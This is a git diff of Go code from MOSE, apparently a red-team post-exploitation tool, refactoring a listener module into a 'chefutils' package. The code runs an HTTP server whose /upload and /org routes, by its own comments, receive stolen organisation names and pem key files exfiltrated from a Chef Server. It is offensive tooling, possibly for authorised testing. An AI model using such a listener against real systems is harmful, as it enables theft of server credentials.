@@ -2,18 +2,20 @@
 // Under the terms of Contract DE-NA0003525 with NTESS,
 // the U.S. Government retains certain rights in this software.
 
-package main
+package chefutils
 
 import (
 	"context"
 	"encoding/json"
-	"github.com/l50/MOSE/pkg/moseutils"
+	"fmt"
 	"io"
 	"log"
 	"net/http"
 	"os"
 	"strings"
 	"time"
+
+	"github.com/l50/MOSE/pkg/moseutils"
 )
 
 // checkInvalidChars detects invalid (and potentially malicious)
@@ -58,8 +60,8 @@ func checkInvalidChars(file string) {
 	}
 }
 
-// fileUpload is used to upload files to a listener
-func fileUpload(w http.ResponseWriter, r *http.Request) {
+// fileUploader is used to upload files to a listener
+func fileUploader(w http.ResponseWriter, r *http.Request) {
 
 	// Limit file uploads to 10 MB files
 	if err := r.ParseMultipartForm(10 << 20); err != nil {
@@ -88,7 +90,7 @@ func fileUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	log.Printf("Successfully uploaded %v", handler.Filename)
+	moseutils.Msg("Successfully exfilled %v", handler.Filename)
 }
 
 // orgUpload is used to exfil org names from a Chef Server
@@ -106,37 +108,37 @@ func orgUpload(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, err.Error(), 400)
 		return
 	}
-	log.Printf("Successfully uploaded %v", org.Name)
+	moseutils.Msg("Successfully uploaded %v", org.Name)
 	// TODO: support multiple orgs
-	UserInput.TargetOrgName = strings.TrimSpace(org.Name)
+	userInput.TargetOrgName = strings.TrimSpace(org.Name)
 }
 
-// createUploadRoute is used to create an exfil route
+// CreateUploadRoute is used to create an exfil route
 // that can be used to steal org names and pem files from a Chef Server
-func createUploadRoute(localIP string, localPort int) {
+func CreateUploadRoute(userInput moseutils.UserInput) {
 	var ip string
-	if localIP == "" {
+	if userInput.LocalIP == "" {
 		ip, _ = moseutils.GetLocalIP()
 		if ip == "" {
 			log.Fatalln("Unable to get local IP address")
 		}
 	} else {
-		ip = localIP
+		ip = userInput.LocalIP
 	}
 	if _, err := os.Stat("keys"); os.IsNotExist(err) {
 		moseutils.CreateFolders([]string{"keys"})
 	}
 
-	http.HandleFunc("/upload", fileUpload)
+	http.HandleFunc("/upload", fileUploader)
 	http.HandleFunc("/org", orgUpload)
 	proto := "http"
-	if UserInput.ServeSSL {
+	if userInput.ServeSSL {
 		proto = "https"
 	}
-	msg("Listener being served at %s://%s:%d/%s-%s for %d seconds", proto, ip, localPort, UserInput.CMTarget, UserInput.OSTarget, UserInput.TimeToServe)
-	srv := moseutils.StartServer(localPort, "", UserInput.ServeSSL, UserInput.SSLCertPath, UserInput.SSLKeyPath, time.Duration(UserInput.TimeToServe)*time.Second, false)
+	fmt.Printf("Listener being served at %s://%s:%d/%s-%s for %d seconds\n", proto, ip, userInput.ExfilPort, userInput.CMTarget, userInput.OSTarget, userInput.TimeToServe)
+	srv := moseutils.StartServer(userInput.ExfilPort, "", userInput.ServeSSL, userInput.SSLCertPath, userInput.SSLKeyPath, time.Duration(userInput.TimeToServe)*time.Second, false)
 
-	info("Web server shutting down...")
+	moseutils.Info("Web server shutting down...")
 
 	if err := srv.Shutdown(context.Background()); err != nil {
 		log.Fatalln(err)
